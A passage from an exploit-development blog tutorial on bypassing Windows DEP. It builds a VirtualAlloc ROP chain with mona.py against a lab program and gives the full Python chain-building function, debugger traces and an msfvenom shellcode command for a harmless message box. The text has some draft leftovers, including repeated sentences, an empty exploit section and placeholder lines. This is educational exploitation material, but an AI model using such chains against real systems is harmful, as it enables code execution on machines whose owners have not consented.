- **dwSize**, size of the region.
- **flAllocationType**, type of memory allocation (MEM_COMMIT will modify the protection of existing memory pages).
- **flProtect**, determines the memory protection for the region of pages to be allocated.
- **Return value**, base address of the allocated region of pages (this address will point to the second-stage payload).

VirtualAlloc can be used to commit memory already committed by specifying its address.  To make a page executable, it's enough to allocate a single byte (len = 1) of that page.


## VirtualAlloc Register Layout

Our ROP payload will use gadgets to produce the parameters for `VirtualAlloc` then use the "PUSHAD" technique to put the parameters on top of the stack.

Here's the necessary stack layout to have `VirtualAlloc` allocate executable memory in our current process:

In order to perform the ROP chain from listing  2.49, the stack can look like presented above.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/rop-VirtualAlloc.png" alt="VirtualAlloc Register layout">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/rop-VirtualAlloc.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

The parameters for an API are passed to a function call in CPU registers containing the required values.  Most of the registers store parameters to the API with the exception of EAX and EDI which are used for padding.  This is what we know so far based on the above summary:

Register | Value | Name
---|---|---
EDI | --- | ROP NOP (Padding)  
ESI | --- | pointer to VirtualAlloc
EBP | --- | Return Address (jmp esp)
ESP | --- | lpAddress (ESP)
EBX | 0x00000001 | dwSize
EDX | 0x00001000 | flAllocationType
ECX | 0x00000040 | flProtect
EAX | 0x90909090 | NOP (Padding)

We need to finish this table before moving on.  I'll leave ESP as is and I'll explain why later.

Let's fill in some of the blanks with the `mona.py` plug-in.

{% comment %}
At the end of the ROP-Chain, the PUSHAD instruction will populate the registers with the necessary parameters and push all registers on the stack at one time.

Here's a quick overview of the values we need to write in for each parameter to have VirtualAlloc allocate executable memory in our current process.
- function call = pointer to VirtualAlloc()
- lpAddress = ESP
- dwSize = 0x1
- flAllocationType = 0x1000 `MEM_COMMIT` (allocate memory charges)
- flProtect = 0x40   `PAGE_EXECUTE_READWRITE` (enable execute access)
- return address = jmp to esp (address of nops/shellcode)
{% highlight python %}
Necessary memory/register state for VirtualAlloc():
---------------------------------------------------

ESI ← 0x????????  ptr to VirtualAlloc \
ESP ← 0x????????  lpAddress (ESP)      \
EBX ← 0x00000001  dwSize                \
EDX ← 0x00001000  flAllocationType      /  Function call parameters
ECX ← 0x00000040  flProtect            /
EBP ← 0x????????  ReturnTo (jmp esp)  /
EAX ← 0x90909090  NOP            \
EDI ← 0x????????  RET (ROP NOP)  /  Padding
+ PUSHAD                 
{% endhighlight %}
{% endcomment %}

##### Pointer to VirtualAlloc()

Mona's `ropfunc` command will find available pointers to API functions that can be used in a ROP chain to bypass DEP.

I'll use mona.py to find a pointer to VirtualAlloc().  With the program open and running in Immunity, use mona's `ropfunc` command to search for API pointers inside kernel32.dll (where VirtualAlloc lives when the dll is loaded into memory).

```
!mona ropfunc -m "kernel32"
```

You can see the results written to the Log window in the below screenshot.  We'll use the pointer at address `0x76e312b8` to fill in ESI.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/ropfunc.png" alt="Mona Ropfunc">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/ropfunc.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

##### Pointer to jmp esp

Mona's `jmp` command searches for pointers that jump to a register.  It requires one argument `-r <register>`.  I'll also specify the modules to search.

```
!mona jmp -r esp -m "kernel32,kernelbase,ntdll"
```

Mona will find all jump, call, and push `<reg>` instructions.  

I'll use the first instruction at `0x7730e4b9 (b+0x0012e4b9)` to fill in EBP.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/jmp.png" alt="Mona JMP">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/jmp.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

##### Pointer to RET

Mona's `find` command can be used to find a pointer to a RET instruction.  There are a few command-specific options to specify.

* -s [pattern], the sequence to search for (mandatory)
* -type [type], type of pattern to search for (bin,asc,ptr,instr,file)
* -x [access] is a global option that specifies pointers with a desired access level.  I'll use `X` to return pointers in executable memory.

```
!mona find -type instr -s "RET" -m "kernel32,kernelbase,ntdll" -x X
```

All the results are written to find.txt.  I'll use the pointer `0x771ee2d9 (b+0x0000e2d9)` for EDI and `0x771ec3fd (b+0x0000c3fd)` to overwrite EIP (as explained [earlier]).

[earlier]: #from-eip-to-rop

### Searching ROP gadgets

To search for gadgets, I prefer to use `rop_suggestions.txt` (generated by `!mona rop`) because it sorts gadgets by the particular function it performs. For example, say I want to find a `POP EAX` instruction.  As shown below, all gadgets that perform `POP EAX` will be grouped together in the same list.  I usually just use the Find feature in Notepad, but you could write a script that searches the file for you.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/rop_suggestions.PNG" alt="Rop suggestions">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/rop_suggestions.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>


## VirtualAlloc Gadgets

In our case, since all data is read from file through fread, we don't need to avoid null bytes.

Now, it's time to create gadgets that will load the necessary values in to the proper registers.

registers set by the ROP chain

The objective is to set the following register state for VirtualAlloc():

Register | Value | Name
---|---|---
EDI | 0x771EC3FD | ROP NOP (Padding)  
ESI | 0x76E312B8 | pointer to VirtualAlloc
EBP | 0x7730E4B9 | Return Address (jmp esp)
ESP | (auto) | lpAddress (ESP)
EBX | 0x00000001 | dwSize
EDX | 0x00001000 | flAllocationType
ECX | 0x00000040 | flProtect
EAX | 0x90909090 | NOP (Padding)


##### Gadget 1: ESI ← &VirtualAlloc

This gadget stores the pointer to VirtualAlloc in ESI.

The first two instructions load the pointer to VirtualAlloc (0x76e312b8) into EAX by writing the address in our payload buffer on the stack and popping it into EAX.  The next instruction will pickup a pointer into EAX and save it into ESI.

{% highlight python %}
KERNELBASE + 0x00142603  # POP EAX # RETN
KERNEL32 + 0x000812b8    # kernelba!virtualalloc (0x772b4570)
KERNELBASE + 0x000d69ba  # MOV EAX,DWORD PTR DS:[EAX] # RETN
KERNELBASE + 0x0011ec9d  # XCHG EAX,ESI # RETN
{% endhighlight %}

This last part saves the dereferenced pointer into ESI.  Let's verify this address using `poi` in WinDbg to follow the reference for the given pointer address `0x76e312b8`.

{% highlight shell %}
0:000> ? poi(0x76e312b8)
Evaluate expression: 1999324528 = 772b4570
{% endhighlight %}

The DWORD address located at this pointer is `0x772b4570`.  We disassemble the code at this address and find out it points to the start of the function `KERNELBASE!VirtualAlloc`.

{% highlight x86asm %}
0:000> u 772b4570
KERNELBASE!VirtualAlloc:
772b4570 8bff            mov     edi,edi
772b4572 55              push    ebp
772b4573 8bec            mov     ebp,esp
772b4575 51              push    ecx
772b4576 51              push    ecx
772b4577 8b450c          mov     eax,dword ptr [ebp+0Ch]
772b457a 8945f8          mov     dword ptr [ebp-8],eax
772b457d 8b4508          mov     eax,dword ptr [ebp+8]
{% endhighlight %}

##### Gadget 2: EBX ← dwSize (0x1)

Gadgets 2, 3, and 4 all store constants into a register.  To get these parameters on the stack, we'll write the value to the stack in our payload buffer then use a `POP <REG>` gadget to place them into the appropriate register.  The instruction sequence is essentially the same for each gadget with the exception of the register and the value to be loaded.  

Each gadget contains a `POP <REG>` followed by the appropriate value.

{% highlight python %}
KERNELBASE + 0x000db60c  # POP EBX # RETN
0x00000001               # 0x00000001-> ebx
{% endhighlight %}

##### Gadget 3: EDX ← flAllocationType (0x1000)

{% highlight python %}
ntdll + 0x0006d38e       # POP EDX # RETN
0x00001000               # 0x00001000-> edx
{% endhighlight %}

##### Gadget 4: ECX ← flProtect (0x40)

{% highlight python %}
KERNELBASE + 0x000e8b8c  # POP ECX # RETN
0x00000040               # 0x00000040-> ecx
{% endhighlight %}

##### (No Gadget) ESP ← lpAddress

Since this value is generated dynamically at run time, we don't need a gadget to set this register.

`lpAddress` will contain the stack pointer (ESP) as its value which points to the second-stage shellcode.  This address is automatically populated by the PUSHAD instruction at the end of the chain.  PUSHAD will take the last address stored in ESP just before it is executed and push it on the stack right after EBP.

##### Gadget 5:  EBP ← jmp to ESP (VirtualAlloc Return Address)

EBP will store the return address of VirtualAlloc.  After VirtualAlloc returns, this instruction will transfer control to the stack where our shellcode is placed.  This can be done using a direct jump into the injected code with a `jmp esp` instruction.

{% highlight python %}
KERNELBASE + 0x0019800c  # POP EBP # RETN
KERNELBASE + 0x0012e4b9  # Return to stack (ptr to jmp esp)
{% endhighlight %}

##### Gadget 6: EDI ← ROP-NOP

Here we can put any random RET instruction into EDI.  This instruction doesn't execute any code.  Instead it's just responsible for advancing the stack pointer into the API call.  I'll use one of the pointers we found with mona's `find` command.

{% highlight python %}
KERNELBASE + 0x0019cc1c  # POP EDI # RETN
KERNELBASE + 0x0000e2d9  # RETN (ROP NOP)
{% endhighlight %}

##### Gadget 7:  EAX ← NOP

This gadget is similar to gadgets 2-4.  EAX is filled with a regular 4-byte NOP.  This register is mainly used for padding the ROP-Chain as it will become the beginning of our shellcode once VirtualAlloc's return address (JMP ESP) is executed.

{% highlight python %}
KERNELBASE + 0x00142603  # POP EAX # RETN
0x90909090               # NOP
{% endhighlight %}

##### Gadget 8: PUSHAD

Our chain ends with a PUSHAD instruction.

{% highlight python %}
KERNELBASE + 0x00021780  # PUSHAD # RETN
{% endhighlight %}

PUSHAD pushes on the stack the registers EAX, ECX, EDX, EBX, original ESP, EBP, ESI, EDI.  The registers are pushed one at a time so the resulting order on the stack is reversed.  
Right before PUHSAD is executed, ESP points to the last dword of the chain (ptr to call esp), and so PUSHAD pushes that value on the stack (ESP automatic).  This value becomes lpAddress which is the starting address of the area of memory whose access protection attributes we want to change.
After PUSHAD, ESP points to the DWORD where EDI was pushed.

Note that the stack is set correctly for VirtualAlloc.
Let's see what is put onto the stack:

I prefer expressing addresses as: baseAddress + RVA
The reason is simple: because of ASLR, the addresses change but the RVAs remain constant.
To try the code, you just need to update the base addresses.  When dealing with ASLR, writing the addresses this way will come in handy.
Even if base addresses change, the RVAs remain constant.
We will build our ROP chain from system libraries (kernel32.dll, ntdll.dll, etc).  Luckily, the base addresses of system libraries change only when Windows is rebooted. OS are already loaded in memory when program is executed.

the base addresses of the modules which support ASLR change every time Windows is rebooted.
RVA offset relative to the base address

The PUSHAD/RET sequence will push all registers on the stack and move ESP to point to the first pushed register (EDI).  Below shows the stack both before and after the PUSHAD/RET instruction executes.

<pre><code class="shell">                <b style="text-decoration: underline;">Address:</b>    <b style="text-decoration: underline;">Stack Contents:</b>
<b style="color:#98c379;">ESP AFTER ====></b> 007cfb7c    771ee2d9  <b style="color:#61aeee">[EDI]</b> = ROP NOP (padding)
                007cfb80    772b4570  <b style="color:#61aeee">[ESI]</b> = VirtualAlloc
                007cfb84    7730e4b9  <b style="color:#61aeee">[EBP]</b> = Return Address
                007cfb88    007cfb9c  <b style="color:#61aeee">[ESP]</b> = lpAddress
                007cfb8c    00000001  <b style="color:#61aeee">[EBX]</b> = dwSize
                007cfb90    00001000  <b style="color:#61aeee">[EDX]</b> = Allocation Type
                007cfb94    00000040  <b style="color:#61aeee">[ECX]</b> = Protect
                007cfb98    90909090  <b style="color:#61aeee">[EAX]</b> = nop (padding)
<b style="color:#98c379;">ESP BEFORE ===></b> 007cfb9c    90909090  <----- NOPSLED
                007cfba0    90909090
                007cfba4    90909090
                007cfba8    90909090
                007cfbac    ...       <----- shellcode
                007cfbb0    ...  
                ...     
</code></pre>

Before PUSHAD returns, the top of the stack points to the start of the NOPSLED.  After PUSHAD returns, the stack pointer grows from `007cfb9c` to `007cfb7c` to make room for the new parameters we set using gadgets and transfers execution back to the stack where ROP NOP was pushed from EDI.

{% comment %}
{% highlight python %}
--- Function call parameters ---
ESI ← 0x76E312B8     ptr to VirtualAlloc
ESP ← (leave as is)  lpAddress (ESP)
EBX ← 0x00000001     dwSize
EDX ← 0x00001000     flAllocationType
ECX ← 0x00000040     flProtect
EBP ← 0x7730E4B9     Return Address (JMP ESP)
--- Other necessary values ---
EAX ← 0x90909090     NOP
EDI ← 0x771EC3FD     RET (ROP NOP)     
{% endhighlight %}
{% endcomment %}

## Constructing the ROP-Chain

Now that we have all our gadgets, it's time to put them together to construct the final chain.  To ensure the proper values are loaded into each register, we'll have to arrange the gadgets in an order that will not change or break the ROP Chain.

Some instructions will modify registers that were set in previous gadgets.  For example, gadgets 1 and 7 both modify EAX.  Gadget 1 only uses EAX as temporary storage for ESI whereas Gadget 7 sets the value of EAX.  In this case, Gadget 1 should come before 7.  

I constructed the above 8 gadgets in the following way.  This function will be added to the exploit code.

{% highlight python %}
def create_rop_chain():
    """
    --- API parameters ---
    ESI ← 0x76E312B8     ptr to VirtualAlloc
    ESP ← (leave as is)  lpAddress (ESP)
    EBX ← 0x00000001     dwSize
    EDX ← 0x00001000     flAllocationType
    ECX ← 0x00000040     flProtect
    EBP ← 0x7730E4B9     Return Address (JMP ESP)
    --- Padding        ---
    EAX ← 0x90909090     NOP
    EDI ← 0x771EC3FD     RET (ROP NOP)
    """

    # base address of loaded modules
    ntdll      = 0x77820000
    kernel32   = 0x76db0000
    kernelbase = 0x771e0000

    rop_chain = ""

    # (6) ---------------------------------------#   [ EDI <- ROP-NOP ]
    rop_chain += pack('<L', kernelbase+0x0019cc1c)   # POP EDI # RETN
    rop_chain += pack('<L', kernelbase+0x0000e2d9)   # RETN (ROP NOP)

    # (4) ---------------------------------------#   [ ECX <- flProtect ]
    rop_chain += pack('<L', kernelbase+0x000e8b8c)   # POP ECX # RETN
    rop_chain += pack('<L',            0x00000040)   # 0x00000040-> ecx

    # (1) ---------------------------------------#   [ ESI <- VirtualAlloc ]
    rop_chain += pack('<L', kernelbase+0x00142603)   # POP EAX # RETN
    rop_chain += pack('<L', kernel32+0x000812b8  )   # kernelba!virtualalloc (0x73fd4570)
    rop_chain += pack('<L', kernelbase+0x000d69ba)   # MOV EAX,DWORD PTR DS:[EAX] # RETN
    rop_chain += pack('<L', kernelbase+0x0011ec9d)   # XCHG EAX,ESI # RETN

    # (3) ---------------------------------------#   [ EDX <- flAllocationType ]
    rop_chain += pack('<L',      ntdll+0x0006d38e)   # POP EDX # RETN
    rop_chain += pack('<L',            0x00001000)   # 0x00001000-> edx

    # (5) ---------------------------------------#   [ EBP <- JMP ESP ]
    rop_chain += pack('<L', kernelbase+0x0019800c)   # POP EBP # RETN
    rop_chain += pack('<L', kernelbase+0x0012e4b9)   # Return To jmp esp

    # (2) ---------------------------------------#   [ EBX <- dwSize ]
    rop_chain += pack('<L', kernelbase+0x000db60c)   # POP EBX # RETN
    rop_chain += pack('<L',            0x00000001)   # 0x00000001-> ebx

    # (7) ---------------------------------------#   [ EAX <- NOP ]
    rop_chain += pack('<L', kernelbase+0x00142603)   # POP EAX # RETN
    rop_chain += pack('<L',            0x90909090)   # NOP

    # (8) ---------------------------------------#   [ End chain with PUSHAD ]
    rop_chain += pack('<L', kernelbase+0x00021780)   # PUSHAD # RETN

    return rop_chain
{% endhighlight %}


# Testing the ROP-Chain

Below is the debugging session which demonstrates the ROP-Chain in action.

We can trace the execution of the ROP-chain using "Run Trace" in Immunity Debugger.  First, attach the exploit to Immunity, set a breakpoint at the first gadget `7737CC1C` (pop edi), then run the program trace with "Trace Into" or CTRL+F11.  I'll also set a breakpoint at VirtualAlloc, so the trace will pause at the end of the ROP-chain.  To view the output, open the "show run trace" window (the '...' icon on the toolbar).

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/runtrace-dep.PNG" alt="breakpoint">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/runtrace-dep.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

The trace output allows us to analyze each instruction executed in the ROP-Chain.  Tracing the execution of each gadget, Following each instruction, we can see that our ROP-Chain loaded the necessary values into each register by checking the "Modified registers" column next to each instruction in the trace.

We can analyze the trace output line-by-line and confirm that each gadget executed as planned by checking the "Modified registers" column next to each instruction in the trace.  Following each instruction, we can see that our ROP-Chain loaded the necessary values into each register.

As shown above, each gadget executed as planned.  This can be confirmed by looking at the "Modified registers" column next to each instruction in the trace.

Next, examine the Stack pane when the program hits the breakpoint at VirtualAlloc.  Our 5 parameters (4 API arguments + Return Address) sit at the top of the stack.  Confirm the desired values by looking at the size, type and protect.

<a href="{{ site.baseurl }}/images/VA_params.png" title="VirtualAlloc Stack">
      <img class="img-center" src="{{ site.baseurl }}/images/VA_params.png" alt="VirtualAlloc Stack">
</a>

With the stack layout setup correctly, we guarantee our API call will execute as intended.

## Testing VirtualAlloc

Just to prove that we are able to execute code right after processing the ROP chain, let's compare the memory protection status of the stack both before and after the ROP-Chain executes VirtualAlloc().

First, run the exploit in the console, attach it to WinDbg, and set a breakpoint at the EIP overwrite address (the RET instruction before the start of the ROP chain).  Continue the exploit until it hits the breakpoint in WinDbg.

{% highlight shell %}
0:001> bu kernelbase+0x0000c3fd
0:001> g
Breakpoint 1 hit
eax=00000568 ebx=00b35000 ecx=381e289e edx=00000000 esi=0088fe24 edi=0088fe28
eip=771ec3fd esp=007cfadc ebp=42424242 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
KERNELBASE!c_Pmap_api_ms_win_security_lsalookup_l1_1_2+0x5:
771ec3fd c3              ret
{% endhighlight %}

This breaks right before the ROP payload is executed.

The [!vprot] extension displays memory protection information.  In this display, `AllocationProtect` is the default protection the region was created with, and `Protect` shows the actual protection (including any changes made by an API like VirtualAlloc).  Currently, it's set to `PAGE_READWRITE`, memory that is readable and writable, but not executable.

[!vprot]: https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vprot

<pre><code class="shell">0:000> !vprot esp
BaseAddress:       007cf000
AllocationBase:    006d0000
AllocationProtect: 00000004  PAGE_READWRITE      <----original protection
RegionSize:        00001000
State:             00001000  MEM_COMMIT
<b style="color:#e06c75">Protect:           00000004  PAGE_READWRITE      <----current protection</b>
Type:              00020000  MEM_PRIVATE
</code></pre>

In WinDbg, step into (`t`) or over (`p`) instructions until we hit the first `90 nop` operation.  This is the very first instruction that gets executed after processing the ROP chain.

{% highlight shell %}
0:000> t
eax=007cf000 ebx=00000001 ecx=51750000 edx=007cf000 esi=772b4570 edi=771ee2d9
eip=007cfb98 esp=007cfb98 ebp=7730e4b9 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
007cfb98 90              nop
{% endhighlight %}

Below, `!vprot esp` displays the memory protection status of the stack after the ROP-chain executes.

`Protect` is now set to `PAGE_EXECUTE_READWRITE`, memory that is executable, readable, and writable.  VirtualAlloc changed the memory protection from `PAGE_READWRITE` to `PAGE_EXECUTE_READWRITE`.  This proves the ROP chain allocated a page with R-W-E permissions.

<pre><code class="shell">0:000> !vprot esp
BaseAddress:       007cf000
AllocationBase:    006d0000
AllocationProtect: 00000004  PAGE_READWRITE          <----original protection
RegionSize:        00001000
State:             00001000  MEM_COMMIT
<b style="color:#e06c75">Protect:           00000040  PAGE_EXECUTE_READWRITE  <----current protection</b>
Type:              00020000  MEM_PRIVATE
</code></pre>

The CPU didn't raise an access violation on the first NOP instruction like in the beginning of the post.  This means that we have bypassed DEP and control will be transferred to our second-stage shellcode!

{% comment %}
```nohighlight
0:000> t
eax=90909090 ebx=00000001 ecx=00000040 edx=00001000 esi=772b4570 edi=771ee2d9
eip=771ee2d9 esp=007cfb80 ebp=7730e4b9 iopl=0         nv up ei pl zr na pe nc
KERNELBASE!c_PmapEntries_ext_ms_onecore_appmodel_staterepository_cache_l1_1_0+0xb1:
771ee2d9 c3              ret
0:000> dd esp
007cfb80  772b4570 7730e4b9 007cfb9c 00000001
007cfb90  00001000 00000040 90909090 90909090
007cfba0  90909090 90909090 90909090 90909090

0:000> t
eax=90909090 ebx=00000001 ecx=00000040 edx=00001000 esi=772b4570 edi=771ee2d9
eip=772b4570 esp=007cfb84 ebp=7730e4b9 iopl=0         nv up ei pl zr na pe nc
KERNELBASE!VirtualAlloc:
772b4570 8bff            mov     edi,edi
0:000> dd esp
007cfb84  7730e4b9 007cfb9c 00000001 00001000
007cfb94  00000040 90909090 90909090 90909090
007cfba4  90909090 90909090 90909090 90909090

0:000> kb
 # ChildEBP | RetAddr  |  Args to Child
 -----------------------------------------------------------------------------              
00 007cfb80 | 7730e4b9 |  007cfb9c 00000001 00001000 KERNELBASE!VirtualAlloc

To get more than 3 Function Arguments from the stack
dd ChildEBP+8 (Parameters start at ChildEBP+8)
dd ChildEBP+8 (frame X) == dd ESP (frame X-1)

0:000> dd 007cfb80+8
007cfb88  007cfb9c 00000001 00001000 00000040
007cfb98  90909090 90909090 90909090 90909090

But you can retrieve arguments from stack manually. You have to check the API reference in MSDN and retrieve augments from stack.
As an example, to get arguments of MessageBoxW() you can set a break point at MessageBoxW().  Now when the break point get hit, you can get them from stack. MessageBoxW() accepts 4 arguments. So we dump 5 stack elements from stack.

0:000> dd esp L5
007cfb84  7730e4b9 007cfb9c 00000001 00001000
007cfb94  00000040

Where 0x01001fc4 is the return address, where MessageBoxW will return. And next 4 pointers are arguments passed to MessageBoxW(). Now you can dump them accordingly.
```
{% endcomment %}


# Exploit Development
The final python script used to generate the script can be found below,
Using the exploit from my [previous post], I'll modify the payload to bypass DEP.  We'll need to return into the ROP payload instead of returning directly into the shellcode (this was discussed in detail at "[From EIP to ROP]").  Below is the desired buffer structure.

[From EIP to ROP]: #from-eip-to-rop

<a href="{{ site.baseurl }}/images/rop-payload.png" title="Zoom In">
<img class="img-center" src="{{ site.baseurl }}/images/rop-payload.png" alt="rop payload">
</a>

Changes from `GS_exploit` in Part 1:

* Address used to overwrite EIP. In this case, we use a pointer to an executable RET instruction to overwrite the return address. (Last time we used the stack pointer leaked by `memleak()`).
* ROP Chain is added between the EIP overwrite and the shellcode.

In our exploit payload, the ROP chain is placed after the stack cookie overwrite.  The function pointer in this location will be overwritten by the address of the first gadget in our ROP chain.  When the corrupted function pointer is invoked, control is transferred to the first ROP gadget at address `0x7787d6b1` in the chain in Listing shown below at `ntdll!_ResReleaseMutex+0x12`.

#### Shellcode

To keep things interesting, I decided to generate new shellcode for this exploit from Metasploit's payload/windows/messagebox module.  This shellcode displays a message box when the injected shellcode gets executed.  We'll need to list the options to use with this module using `--list-options`.

```
C:\metasploit-framework\bin> msfvenom -p windows/messagebox --list-options
Options for payload/windows/messagebox:
=========================
       Name: Windows MessageBox
     Module: payload/windows/messagebox
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 272
       Rank: Normal

Provided by:
    corelanc0d3r <peter.ve@corelan.be>
    jduck <jduck@metasploit.com>

Basic options:
Name      Current Setting   Required  Description
----      ---------------   --------  -----------
EXITFUNC  process           yes       Exit technique (Accepted: '', seh, thread, process, none)
ICON      NO                yes       Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION
TEXT      Hello, from MSF!  yes       Messagebox Text (max 255 chars)
TITLE     MessageBox        yes       Messagebox Title (max 255 chars)

Description:
  Spawns a dialog via MessageBox using a customizable title, text & icon
```

The required payload options are `TITLE` and `TEXT`.  `TITLE` is the text at the top of the message box and `TEXT` is the information inside the window.  The rest of the options I leave out of the command to accept the default settings.

```bash
$ msfvenom -p windows/messagebox TITLE="PWNED BY CLAR" TEXT="better luck next time, Microsoft ;p" -e x86/shikata_ga_nai -f python -v shellcode
```

When the shellcode gets executed, this is the MessageBox dialog that pops up.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/messagebox.PNG" alt="MessageBox">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/messagebox.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

# Exploit Code


# Exploit Demo

This backdoored executable should display a message box and give back the control to the main application.

photo of messagebox

When the exploit code invokes `vuln-dep.exe`, we can use Process Explorer to check its current mitigation settings.  This verifies that ASLR and Permanent DEP are enabled on our vulnerable program.


<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/depmitigation.PNG" alt="DEP Exploit Mitigations">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/depmitigation.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/depexploit.PNG" alt="DEP Exploit">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/depexploit.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

<a href="{{ site.baseurl }}/images/video/depexploit.gif" alt="Exploit Gif">
  <img src="{{ site.baseurl }}/images/video/depexploit.gif" alt="Exploit Gif">
</a>


# References
* [mona.py the manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
* [mona.py github repo](https://github.com/corelan/mona)
* [DEP ASLR bypass with mona.py](https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/)
* [Exploit writing tutorial part 10: Chaining DEP with ROP by Corelan Team (06/16/2010)](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)
* [Return-Oriented Exploitation by Dai Zovi, BlackHat USA 2010](https://media.blackhat.com/bh-us-10/presentations/Zovi/BlackHat-USA-2010-DaiZovi-Return-Oriented-Exploitation-slides.pdf)
* [Return-Oriented Programming by Shacham et. al](https://hovav.net/ucsd/dist/rop.pdf)
* [Return-oriented Programming: Exploitation without Code Injection by Hovav Shacham et al., BlackHat USA 2008](https://hovav.net/ucsd/dist/blackhat08.pdf)
* [The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86) By Hovav Shacham, ACM CCS 2007](https://hovav.net/ucsd/dist/geometry.pdf)
* [Data Execution Prevention in Windows](https://docs.microsoft.com/en-us/windows/desktop/Memory/data-execution-prevention)
* [VirtualAlloc function, MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx)

[1]: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
[2]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
[3]: https://hovav.net/ucsd/dist/rop.pdf
[4]: https://github.com/corelan/mona
[5]: https://hovav.net/ucsd/dist/geometry.pdf
[previous post]: {{ site.baseurl }}{% link _posts/2018-07-12-windows-bypass-1.md %}
